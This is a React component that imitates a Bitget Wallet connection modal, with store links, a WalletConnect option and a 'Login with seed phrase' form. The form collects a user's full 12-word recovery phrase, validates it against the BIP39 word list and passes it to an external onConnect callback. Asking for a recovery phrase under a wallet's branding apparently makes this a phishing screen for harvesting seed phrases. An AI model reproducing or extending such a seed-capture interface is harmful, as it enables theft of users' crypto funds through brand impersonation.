'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';
import WalletConnectModal from './WalletConnectModal';



export default function BitgetWalletModal({ onClose, onBack, onConnect }) {
  const [showSwapView, setShowSwapView] = useState(false);
  const [showSeedInput, setShowSeedInput] = useState(false);
  const [showBitgetWalletView, setShowBitgetWalletView] = useState(false);
  const [bitgetTab, setBitgetTab] = useState('plugin');
  const [showWalletConnect, setShowWalletConnect] = useState(false);
  const [walletConnectKey, setWalletConnectKey] = useState(0);
  const [walletConnectOrigin, setWalletConnectOrigin] = useState(null);
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handleWordChange = (index, value) => {
    const normalized = value.toLowerCase().trim();
    const next = [...seedWords];
    next[index] = normalized;
    setSeedWords(next);

    const nextInvalid = new Set(invalidWords);
    if (normalized && !isValidBip39Word(normalized)) nextInvalid.add(index);
    else nextInvalid.delete(index);
    setInvalidWords(nextInvalid);
  };

  const handleSeedConnect = () => {
    const filled = seedWords.filter((w) => w.length > 0).length;
    const allValid = filled === 12 && invalidWords.size === 0;
    if (!allValid) return;
    if (onConnect) onConnect('Bitget Wallet', { method: 'seedPhrase', phrase: seedWords.join(' ') });
    if (onClose) onClose();
  };

  const handleQuickLogin = (method) => {
    if (onConnect) onConnect('Bitget Wallet', { method });
    if (onClose) onClose();
  };

  const handleWalletConnectBack = () => {
    setShowWalletConnect(false);
    if (walletConnectOrigin === 'swap') setShowSwapView(true);
    if (walletConnectOrigin === 'bitget') setShowBitgetWalletView(true);
    setWalletConnectOrigin(null);
  };

  const openWalletConnect = (origin = null) => {
    setWalletConnectOrigin(origin);
    setShowWalletConnect(true);
    setWalletConnectKey((prev) => prev + 1);
  };

  if (showWalletConnect) {
    return (
      <WalletConnectModal
        key={walletConnectKey}
        walletName="WalletConnect"
        onClose={onClose}
        onConnect={onConnect}
        onBack={handleWalletConnectBack}
      />
    );
  }

  if (showBitgetWalletView) {
    return (
      <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
        <div className="modal-content" style={{ maxWidth: 640 }}>
          <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <button className="close-btn" onClick={() => setShowBitgetWalletView(false)} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
            <h2 style={{ margin: 0, textAlign: 'center' }}>Bitget Wallet</h2>
            <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
          </div>

          <div className="modal-body">
            <div style={{ display: 'flex', gap: 12, marginBottom: 20 }}>
              <button
                type="button"
                onClick={() => setBitgetTab('plugin')}
                style={{
                  flex: 1,
                  padding: 12,
                  borderRadius: 10,
                  border: bitgetTab === 'plugin' ? '1px solid var(--cyan)' : '1px solid rgba(255,255,255,0.12)',
                  background: bitgetTab === 'plugin' ? 'rgba(52, 211, 153, 0.12)' : 'transparent',
                  color: '#ffffff',
                  fontWeight: 700,
                  cursor: 'pointer',
                }}
              >
                Connect via plugin
              </button>
              <button
                type="button"
                onClick={() => setBitgetTab('download')}
                style={{
                  flex: 1,
                  padding: 12,
                  borderRadius: 10,
                  border: bitgetTab === 'download' ? '1px solid var(--cyan)' : '1px solid rgba(255,255,255,0.12)',
                  background: bitgetTab === 'download' ? 'rgba(52, 211, 153, 0.12)' : 'transparent',
                  color: '#ffffff',
                  fontWeight: 700,
                  cursor: 'pointer',
                }}
              >
                Download app
              </button>
            </div>

            {bitgetTab === 'plugin' ? (
              <div style={{ padding: 24, borderRadius: 18, background: 'rgba(255,255,255,0.04)', textAlign: 'center' }}>
                <div style={{ marginBottom: 20, display: 'inline-flex', padding: 18, borderRadius: 24, background: 'rgba(255,255,255,0.06)' }}>
                  <img src="/icons/Bitget Icon.png" alt="Bitget Wallet" style={{ width: 40, height: 40, objectFit: 'contain' }} />
                </div>
                <h3 style={{ margin: '0 0 10px', color: '#ffffff', fontSize: 20 }}>Bitget Wallet</h3>
                <p style={{ margin: 0, color: 'var(--text-dim)', lineHeight: 1.6 }}>
                  Coming soon. Stay tuned for plugin support that will let you connect Bitget Wallet directly in the browser.
                </p>
              </div>
            ) : (
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, alignItems: 'center' }}>
                <div style={{ padding: 20, borderRadius: 18, background: 'rgba(255,255,255,0.04)' }}>
                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 18 }}>
                    <img src="/icons/Bitget Icon.png" alt="Bitget Wallet" style={{ width: 48, height: 48 }} />
                  </div>
                  <p style={{ color: '#ffffff', fontWeight: 700, marginBottom: 12, textAlign: 'center' }}>Scan the QR code to download</p>
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, lineHeight: 1.5, textAlign: 'center' }}>
                    Available for iOS and Android.
                  </p>
                </div>
                <div style={{ display: 'grid', gap: 12, padding: 20, borderRadius: 18, background: 'rgba(255,255,255,0.04)', textAlign: 'center' }}>
                  <div style={{ width: '100%', paddingTop: '100%', position: 'relative', borderRadius: 18, background: 'rgba(255,255,255,0.08)', overflow: 'hidden' }}>
                    <img src="/icons/download.png" alt="Download" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', objectFit: 'contain' }} />
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'center', gap: 10 }}>
                    <a href="https://apps.apple.com/app/id1395301115" target="_blank" rel="noopener noreferrer" style={{ flex: 1, padding: 12, borderRadius: 10, border: '1px solid rgba(255,255,255,0.12)', color: 'var(--text)', textDecoration: 'none' }}>App Store</a>
                    <a href="https://play.google.com/store/apps/details?id=com.bitkeep.wallet" target="_blank" rel="noopener noreferrer" style={{ flex: 1, padding: 12, borderRadius: 10, border: '1px solid rgba(255,255,255,0.12)', color: 'var(--text)', textDecoration: 'none' }}>Google Play</a>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  if (showSwapView) {
    return (
      <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
        <div className="modal-content" style={{ maxWidth: 640 }}>
          <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <button className="close-btn" onClick={() => { if (showSeedInput) { setShowSeedInput(false); } else { setShowSwapView(false); } }} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
            <h2 style={{ margin: 0, textAlign: 'center' }}>Connect wallet</h2>
            <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
          </div>

          <div className="modal-body">
            {!showSeedInput ? (
              <>
                <div style={{ display: 'flex', gap: 20, alignItems: 'flex-start', marginBottom: 20 }}>
                  <div style={{ flex: 1 }}>
                    <div style={{ marginBottom: 14, color: '#ffffff' }}>Default wallet</div>
                    <button style={{ width: '100%', padding: 14, borderRadius: 12, background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.06)', display: 'flex', alignItems: 'center', gap: 12, color: '#ffffff' }} onClick={() => { setShowSwapView(true); setShowSeedInput(false); }}>
                      <img src="/icons/Bitget Icon.png" alt="default" style={{ width: 36, height: 36 }} />
                      <span style={{ fontWeight: 700, color: 'inherit' }}>Bitget default wallet</span>
                    </button>

                    <div style={{ marginTop: 18, marginBottom: 8, color: '#ffffff' }}>On-chain wallet</div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                      <button style={{ display: 'flex', alignItems: 'center', gap: 12, padding: 12, borderRadius: 10, background: 'transparent', border: '1px solid rgba(255,255,255,0.03)', color: '#ffffff' }} onClick={() => setShowBitgetWalletView(true)}>
                        <img src="/icons/Bitget Icon.png" alt="Bitget" style={{ width: 28, height: 28 }} />
                        <span style={{ fontWeight: 700, color: 'inherit' }}>Bitget Wallet</span>
                      </button>
                      <button style={{ display: 'flex', alignItems: 'center', gap: 12, padding: 12, borderRadius: 10, background: 'transparent', border: '1px solid rgba(255,255,255,0.03)', color: '#ffffff' }} onClick={() => openWalletConnect('swap')}>
                        <img src="/icons/walletConnect.svg" alt="WalletConnect" style={{ width: 28, height: 28 }} />
                        <span style={{ fontWeight: 700, color: 'inherit' }}>WalletConnect</span>
                      </button>
                    </div>
                  </div>

                  <div style={{ width: 320, textAlign: 'center' }}>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10, marginBottom: 18, flexWrap: 'wrap' }}>
                      <img src="/icons/Wallet_Light.f7315cb2.png" alt="wallet icon" style={{ width: 28, height: 28 }} />
                      <p style={{ color: '#ffffff', margin: 0 }}>Experience Web3 and tokenized economy, and explore unlimited opportunities!</p>
                    </div>
                    <button onClick={() => setShowSeedInput(true)} style={{ width: '100%', padding: 12, borderRadius: 10, background: 'transparent', border: '1px solid rgba(255,255,255,0.08)', color: 'var(--text-dim)' }}>Login with seed phrase</button>
                  </div>
                </div>
              </>
            ) : (
              <>
                <p style={{ textAlign: 'center', color: '#ffffff', marginBottom: 12 }}>Enter your seed phrase to import your Bitget wallet</p>
                <div style={{
                  display: 'grid',
                  gridTemplateColumns: 'repeat(2, 1fr)',
                  gap: 12,
                  marginBottom: 20,
                  maxHeight: 360,
                  overflowY: 'auto',
                }}>
                  {seedWords.map((word, index) => (
                    <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                      <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{index + 1}</span>
                      <input type="text" placeholder="Word" value={word} onChange={(e) => handleWordChange(index, e.target.value)} style={{ flex: 1, padding: '8px 10px', border: `1px solid ${invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`, borderRadius: 8, background: 'transparent', color: 'var(--text)' }} />
                    </div>
                  ))}
                </div>
                <div style={{ display: 'flex', gap: 8 }}>
                  <button onClick={handleSeedConnect} style={{ flex: 1, padding: 12, borderRadius: 10, background: 'var(--cyan)', color: 'var(--bg)', fontWeight: 700, border: 'none' }}>Import</button>
                  <button onClick={() => setShowSeedInput(false)} style={{ padding: 12, borderRadius: 10, background: 'transparent', border: '1px solid rgba(255,255,255,0.08)', color: 'var(--text-dim)' }}>Cancel</button>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {onBack ? (
            <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : null}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Bitget Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          <div style={{ textAlign: 'center', marginBottom: 24 }}>
            <div style={{
              width: 72,
              height: 72,
              margin: '0 auto 16px',
              borderRadius: 22,
              background: 'rgba(255,255,255,0.06)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}>
              <img src="/icons/Bitget Icon.png" alt="Bitget Wallet" style={{ width: 42, height: 42, objectFit: 'contain' }} />
            </div>
            <p style={{ margin: 0, fontSize: 14, color: '#ffffff', lineHeight: 1.5, marginBottom: 20 }}>
              Connect Bitget Wallet through the browser extension or mobile apps and open the Bitget Web3 swap experience for bridging and DeFi.
            </p>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
              <a
                href="https://chromewebstore.google.com/detail/bitget-wallet-crypto-web3/jiidiaalihmmhddjgbnbgdfflelocpak"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  padding: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  borderRadius: 8,
                  background: 'transparent',
                  color: 'var(--text)',
                  textDecoration: 'none',
                  cursor: 'pointer',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <img src="/icons/chrome-icon.svg" alt="Extension" style={{ width: 24, height: 24 }} />
                  <span style={{ fontSize: 14, fontWeight: 500 }}>Browser extension</span>
                </div>
                <span style={{ color: 'var(--cyan)' }}>→</span>
              </a>
              <a
                href="https://apps.apple.com/app/id1395301115"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  padding: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  borderRadius: 8,
                  background: 'transparent',
                  color: 'var(--text)',
                  textDecoration: 'none',
                  cursor: 'pointer',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <img src="/icons/App_Store_(iOS).svg" alt="App Store" style={{ width: 24, height: 24 }} />
                  <span style={{ fontSize: 14, fontWeight: 500 }}>App Store</span>
                </div>
                <span style={{ color: 'var(--cyan)' }}>→</span>
              </a>
              <a
                href="https://play.google.com/store/apps/details?id=com.bitkeep.wallet"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  padding: 12,
                  border: '1px solid rgba(255,255,255,0.15)',
                  borderRadius: 8,
                  background: 'transparent',
                  color: 'var(--text)',
                  textDecoration: 'none',
                  cursor: 'pointer',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <img src="/icons/play-store-icon.svg" alt="Google Play" style={{ width: 24, height: 24 }} />
                  <span style={{ fontSize: 14, fontWeight: 500 }}>Google Play</span>
                </div>
                <span style={{ color: 'var(--cyan)' }}>→</span>
              </a>
            </div>
          </div>

          <button onClick={() => setShowSwapView(true)} style={{ display: 'block', width: '100%', textAlign: 'center', padding: 12, borderRadius: 8, border: '1px solid rgba(255,255,255,0.15)', background: 'rgba(255,255,255,0.03)', color: 'var(--cyan)', textDecoration: 'none', fontWeight: 700 }}>Open Bitget Web3 Swap</button>
        </div>
      </div>
    </div>
  );
}
